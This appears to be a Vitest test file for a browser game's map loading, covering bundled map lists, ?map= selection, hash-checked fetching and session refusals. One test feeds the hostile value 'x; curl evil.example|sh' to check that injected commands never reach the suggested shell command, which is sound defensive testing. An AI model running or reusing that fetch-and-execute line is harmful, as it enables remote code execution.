import { readdirSync, readFileSync } from "node:fs";
import { fileURLToPath } from "node:url";
import { type Cmap, decodeCmap } from "@game/shared";
import { afterEach, describe, expect, it, vi } from "vitest";
import {
  bundledMaps,
  chooseWorkerMap,
  DEFAULT_WORKER_MAP,
  fetchMap,
  loadServerMap,
  type MapFile,
  mapUrl,
} from "../../src/app/maps";

// The page's map loading for a dedicated server (D-031, docs/05 §2, docs/07 §2): the bundled
// files, and the refusals that end the session with a reason the page shows.

const mapsDir = fileURLToPath(new URL("../../../../content/maps", import.meta.url));
const bytesOf = (name: string) => new Uint8Array(readFileSync(`${mapsDir}/${name}.cmap`));
const arena = decodeCmap(bytesOf("arena_greybox"));

/** `fetch` answering every request with `name`'s file (or a status), recording the URLs. */
function stubFetch(name: string | null, status = 200) {
  const urls: string[] = [];
  vi.stubGlobal("fetch", async (url: string) => {
    urls.push(url);
    const body = name === null ? new Uint8Array(0) : bytesOf(name);
    return new Response(body, { status, statusText: status === 200 ? "OK" : "Not Found" });
  });
  return urls;
}

/** A client stand-in: takes a map, or refuses it with `refusal`, and records disconnects. */
function taker(refusal: string | null = null) {
  const t = {
    took: [] as Cmap[],
    closed: [] as string[],
    provideMap: (cmap: Cmap) => {
      if (refusal !== null) return refusal;
      t.took.push(cmap);
      return null;
    },
    disconnect: (reason: string) => {
      t.closed.push(reason);
    },
  };
  return t;
}

afterEach(() => {
  vi.unstubAllGlobals();
});

describe("bundled maps (D-031)", () => {
  it("ships every compiled map under its name", () => {
    const files = readdirSync(mapsDir)
      .filter((f) => f.endsWith(".cmap"))
      .map((f) => f.slice(0, -".cmap".length))
      .sort();
    expect(bundledMaps()).toEqual(files);
    for (const name of files) expect(mapUrl(name)).toMatch(new RegExp(`${name}\\.cmap`));
    expect(mapUrl("no_such_map")).toBeUndefined();
  });

  it("runs the local server on movement_lab, or on any bundled course ?map= names (D-063)", () => {
    expect(chooseWorkerMap(null, null)).toEqual({ name: "movement_lab", warning: null });
    expect(DEFAULT_WORKER_MAP).toBe("movement_lab");
    for (const name of ["movement_lab", "jump_lab", "slide_lab", "fall_tower", "arena_greybox"]) {
      expect(chooseWorkerMap(name, null)).toEqual({ name, warning: null });
    }
  });

  it.each([
    "no_such_map",
    "JUMP_LAB",
    "jump_lab.cmap",
    "../maps/jump_lab",
    "/content/maps/jump_lab.cmap",
    "http://example.org/jump_lab.cmap",
    "constructor",
    "",
  ])("plays movement_lab, with a warning, for a ?map= that names no bundled course: %j", (name) => {
    const choice = chooseWorkerMap(name, null);
    expect(choice.name).toBe("movement_lab");
    expect(choice.warning).toBe(
      `unknown map ${JSON.stringify(name)} (this client has ${bundledMaps().join(", ")}); playing movement_lab`,
    );
  });

  it("ignores ?map= with a warning when a dedicated server picks the map", () => {
    expect(chooseWorkerMap("jump_lab", "ws://localhost:28700")).toEqual({
      name: "movement_lab",
      warning:
        '?map="jump_lab" is ignored: it picks the local server\'s map, and a dedicated server runs its own (pnpm dev:server --map jump_lab)',
    });
    expect(chooseWorkerMap(null, "ws://localhost:28700").warning).toBeNull();
  });

  it("never puts a ?map= this build lacks into the suggested command, and quotes it", () => {
    const hostile = "x; curl evil.example|sh";
    expect(chooseWorkerMap(hostile, "ws://localhost:28700")).toEqual({
      name: "movement_lab",
      warning: `?map=${JSON.stringify(hostile)} is ignored: it picks the local server's map, and a dedicated server runs its own`,
    });
  });

  it("fetches the map WELCOME names when its hash matches", async () => {
    const urls = stubFetch("arena_greybox");
    const file = await fetchMap("arena_greybox", arena.contentHash);
    expect(urls).toEqual([mapUrl("arena_greybox")]);
    expect(file.cmap.name).toBe("arena_greybox");
    expect(file.bytes).toEqual(bytesOf("arena_greybox"));
  });

  it("refuses a map this build lacks, another version, a file of another map, a failed fetch", async () => {
    stubFetch("arena_greybox");
    await expect(fetchMap("no_such_map", "0123456789abcdef")).rejects.toThrow(
      `this client has no map no_such_map (it has ${bundledMaps().join(", ")})`,
    );
    await expect(fetchMap("arena_greybox", "0123456789abcdef")).rejects.toThrow(
      `map arena_greybox: the server runs version 0123456789abcdef, this client has ${arena.contentHash}`,
    );
    stubFetch("jump_lab");
    await expect(fetchMap("arena_greybox")).rejects.toThrow(
      "map file arena_greybox holds map jump_lab",
    );
    stubFetch(null, 404);
    await expect(fetchMap("arena_greybox")).rejects.toThrow(
      "map arena_greybox: download failed: 404 Not Found",
    );
  });

  it("hands the map over, or ends the session with the reason", async () => {
    stubFetch("arena_greybox");
    const ok = taker();
    expect(await loadServerMap(ok, "arena_greybox", arena.contentHash)).toBe(ok.took[0]);
    expect(ok.took.map((m) => m.name)).toEqual(["arena_greybox"]);
    expect(ok.closed).toEqual([]);

    const stale = taker();
    expect(await loadServerMap(stale, "arena_greybox", "0123456789abcdef")).toBeNull();
    expect(stale.took).toEqual([]);
    expect(stale.closed).toEqual([
      `map arena_greybox: the server runs version 0123456789abcdef, this client has ${arena.contentHash}`,
    ]);

    // The client's own refusal ends the session itself; the loader adds nothing.
    const refuses = taker("a map is already loaded (jump_lab)");
    expect(await loadServerMap(refuses, "arena_greybox", arena.contentHash)).toBeNull();
    expect(refuses.closed).toEqual([]);

    const odd = taker();
    const throwsString = (): Promise<MapFile> => Promise.reject("disk gone");
    expect(await loadServerMap(odd, "arena_greybox", "x", throwsString)).toBeNull();
    expect(odd.closed).toEqual(["disk gone"]);
  });
});
